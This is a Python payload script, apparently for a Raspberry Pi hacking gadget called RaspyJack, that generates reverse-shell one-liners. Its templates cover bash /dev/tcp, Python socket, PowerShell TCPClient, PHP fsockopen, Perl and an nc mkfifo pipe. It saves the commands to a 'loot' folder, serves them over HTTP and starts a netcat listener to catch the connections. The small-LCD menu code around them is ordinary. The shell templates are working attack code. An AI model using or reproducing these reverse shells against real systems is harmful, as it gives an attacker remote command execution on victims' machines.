#!/usr/bin/env python3
"""
RaspyJack Payload -- Reverse Shell Generator & Server
------------------------------------------------------
Author: 7h30th3r0n3

Generate reverse shell one-liners, serve them via HTTP, start listeners.
Loots generated commands to /root/Raspyjack/loot/Shells/.

Controls:
  UP/DOWN  = scroll shell types / menu
  OK       = generate & display one-liner (scrollable)
  KEY1     = start HTTP server on port 8888 serving payload
  KEY2     = start nc listener on selected port
  KEY3     = exit
"""

import os
import sys
import time
import signal
import socket
import subprocess
import threading

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

DEBOUNCE = 0.25
LOOT_DIR = "/root/Raspyjack/loot/Shells"
DEFAULT_PORT = 4444
HTTP_PORT = 8888

SHELL_TYPES = ["bash", "python", "powershell", "php", "perl", "nc"]


def _get_ip(iface):
    """Get IPv4 address for an interface."""
    try:
        res = subprocess.run(
            ["ip", "-4", "addr", "show", "dev", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in res.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return None


def _get_all_ips():
    """Get IPs for eth0, wlan0, tailscale0."""
    result = {}
    for iface in ["eth0", "wlan0", "tailscale0"]:
        ip = _get_ip(iface)
        if ip:
            result[iface] = ip
    return result


def _generate_shell(shell_type, ip, port):
    """Generate a reverse shell one-liner. Returns the command string."""
    port_s = str(port)

    templates = {
        "bash": (
            f"bash -i >& /dev/tcp/{ip}/{port_s} 0>&1"
        ),
        "python": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{ip}\",{port_s}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "powershell": (
            f"powershell -nop -c \"$c=New-Object "
            f"System.Net.Sockets.TCPClient('{ip}',{port_s});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length))-ne 0)"
            f"{{$d=(New-Object -TypeName "
            f"System.Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$o=(iex $d 2>&1|Out-String);"
            f"$r=$o+'PS '+(pwd).Path+'> ';"
            f"$sb=([text.encoding]::ASCII).GetBytes($r);"
            f"$s.Write($sb,0,$sb.Length);$s.Flush()}};"
            f"$c.Close()\""
        ),
        "php": (
            f"php -r '$s=fsockopen(\"{ip}\",{port_s});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        "perl": (
            f"perl -e 'use Socket;"
            f"$i=\"{ip}\";$p={port_s};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
            f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            f"open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'"
        ),
        "nc": (
            f"rm /tmp/f;mkfifo /tmp/f;"
            f"cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port_s} >/tmp/f"
        ),
    }

    return templates.get(shell_type, f"echo 'Unknown shell type: {shell_type}'")


def _save_to_loot(shell_type, command, ip, port):
    """Save generated command to loot directory."""
    try:
        os.makedirs(LOOT_DIR, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        filename = f"{shell_type}_{ts}.txt"
        filepath = os.path.join(LOOT_DIR, filename)
        content = (
            f"# Reverse Shell: {shell_type}\n"
            f"# Target: {ip}:{port}\n"
            f"# Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"{command}\n"
        )
        with open(filepath, "w") as fh:
            fh.write(content)
        return filepath
    except OSError:
        return None


def _wrap_text(text, width=19):
    """Wrap text into lines of max width characters."""
    lines = []
    while text:
        lines.append(text[:width])
        text = text[width:]
    return lines


def _draw_main(lcd, ips, shell_types, selected, port, status="", http_running=False, nc_running=False):
    """Draw main menu."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 12), fill="#1a1a1a")
    d.text((2, 1), "RevShell Gen", font=font, fill="#00ff00")
    d.text((100, 1), "K3", font=font, fill="white")

    y = 15

    # Show IPs
    for iface, ip in ips.items():
        label = iface.replace("tailscale0", "ts0")
        d.text((2, y), f"{label}: {ip}", font=font, fill="#888888")
        y += 10
    y += 2

    # Port
    d.text((2, y), f"Port: {port}", font=font, fill="#aaaaaa")
    y += 12

    # Shell types
    for idx, stype in enumerate(shell_types):
        prefix = ">" if idx == selected else " "
        color = "#00ff00" if idx == selected else "#aaaaaa"
        d.text((2, y), f"{prefix}{stype}", font=font, fill=color)
        y += 11

    # Status indicators
    y = 106
    d.line((0, y, 127, y), fill="#333333")
    indicators = []
    if http_running:
        indicators.append("HTTP:ON")
    if nc_running:
        indicators.append("NC:ON")
    if indicators:
        d.text((2, y + 1), " ".join(indicators), font=font, fill="#ffff00")

    d.text((2, y + 12), "OK=gen K1=http K2=nc", font=font, fill="#666666")

    if status:
        d.rectangle((0, 50, 127, 65), fill="#222200")
        d.text((2, 52), status[:20], font=font, fill="#ffff00")

    lcd.LCD_ShowImage(img, 0, 0)


def _draw_shell_view(lcd, shell_type, lines, scroll_offset):
    """Draw the generated shell command (scrollable)."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 12), fill="#1a1a1a")
    d.text((2, 1), f"Shell: {shell_type}", font=font, fill="#00ff00")

    y = 15
    visible = 8
    end = min(len(lines), scroll_offset + visible)
    for idx in range(scroll_offset, end):
        d.text((2, y), lines[idx], font=font, fill="#cccccc")
        y += 12

    if len(lines) > visible:
        d.text((100, 15), f"{scroll_offset + 1}/{len(lines)}", font=font, fill="#666666")

    d.text((2, 116), "U/D=scrl K3=back", font=font, fill="#666666")

    lcd.LCD_ShowImage(img, 0, 0)


def _start_http_server(payload_text, port):
    """Start a simple HTTP server serving the payload. Returns process."""
    tmp_dir = "/tmp/rj_shell_serve"
    os.makedirs(tmp_dir, exist_ok=True)
    payload_path = os.path.join(tmp_dir, "payload.txt")
    with open(payload_path, "w") as fh:
        fh.write(payload_text)

    try:
        proc = subprocess.Popen(
            ["python3", "-m", "http.server", str(port)],
            cwd=tmp_dir,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )
        return proc
    except OSError:
        return None


def _start_nc_listener(port):
    """Start a netcat listener. Returns process."""
    try:
        proc = subprocess.Popen(
            ["nc", "-lvnp", str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )
        return proc
    except OSError:
        return None


def _kill_process(proc):
    """Terminate a subprocess group safely."""
    if proc is None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except (OSError, ProcessLookupError):
        pass
    try:
        proc.wait(timeout=2)
    except subprocess.TimeoutExpired:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except (OSError, ProcessLookupError):
            pass


def main():
    """Main entry point."""
    selected = 0
    port = DEFAULT_PORT
    last_press = 0.0
    status = ""
    mode = "main"  # main | view
    view_lines = []
    view_scroll = 0
    view_type = ""
    http_proc = None
    nc_proc = None
    last_payload = ""

    ips = _get_all_ips()
    if not ips:
        ips = {"lo": "127.0.0.1"}

    # Pick first available IP as default
    default_ip = list(ips.values())[0]

    try:
        while True:
            btn = get_button(PINS, GPIO)
            now = time.time()

            if btn and (now - last_press) < DEBOUNCE:
                btn = None
            if btn:
                last_press = now

            if mode == "view":
                if btn == "KEY3":
                    mode = "main"
                elif btn == "UP":
                    view_scroll = max(0, view_scroll - 1)
                elif btn == "DOWN":
                    view_scroll = min(max(0, len(view_lines) - 8), view_scroll + 1)

                _draw_shell_view(LCD, view_type, view_lines, view_scroll)
                time.sleep(0.08)
                continue

            # Main mode
            if btn == "KEY3":
                break
            elif btn == "UP":
                selected = max(0, selected - 1)
            elif btn == "DOWN":
                selected = min(len(SHELL_TYPES) - 1, selected + 1)
            elif btn == "OK":
                shell_type = SHELL_TYPES[selected]
                command = _generate_shell(shell_type, default_ip, port)
                last_payload = command
                saved = _save_to_loot(shell_type, command, default_ip, port)
                view_type = shell_type
                view_lines = _wrap_text(command, 19)
                view_scroll = 0
                mode = "view"
                if saved:
                    status = "Saved to loot"
                else:
                    status = "Generated (no save)"
            elif btn == "KEY1":
                if http_proc is not None:
                    _kill_process(http_proc)
                    http_proc = None
                    status = "HTTP stopped"
                else:
                    payload = last_payload if last_payload else _generate_shell(
                        SHELL_TYPES[selected], default_ip, port,
                    )
                    http_proc = _start_http_server(payload, HTTP_PORT)
                    if http_proc:
                        status = f"HTTP on :{HTTP_PORT}"
                    else:
                        status = "HTTP start failed"
            elif btn == "KEY2":
                if nc_proc is not None:
                    _kill_process(nc_proc)
                    nc_proc = None
                    status = "NC stopped"
                else:
                    nc_proc = _start_nc_listener(port)
                    if nc_proc:
                        status = f"NC on :{port}"
                    else:
                        status = "NC start failed"
            elif btn == "LEFT":
                port = max(1024, port - 1)
            elif btn == "RIGHT":
                port = min(65535, port + 1)

            http_running = http_proc is not None and http_proc.poll() is None
            nc_running = nc_proc is not None and nc_proc.poll() is None

            if http_proc and not http_running:
                http_proc = None
            if nc_proc and not nc_running:
                nc_proc = None

            _draw_main(
                LCD, ips, SHELL_TYPES, selected, port, status,
                http_running, nc_running,
            )
            time.sleep(0.08)

    finally:
        _kill_process(http_proc)
        _kill_process(nc_proc)
        # Clean temp files
        try:
            tmp_payload = "/tmp/rj_shell_serve/payload.txt"
            if os.path.exists(tmp_payload):
                os.remove(tmp_payload)
            tmp_dir = "/tmp/rj_shell_serve"
            if os.path.isdir(tmp_dir):
                os.rmdir(tmp_dir)
        except OSError:
            pass
        LCD.LCD_Clear()
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
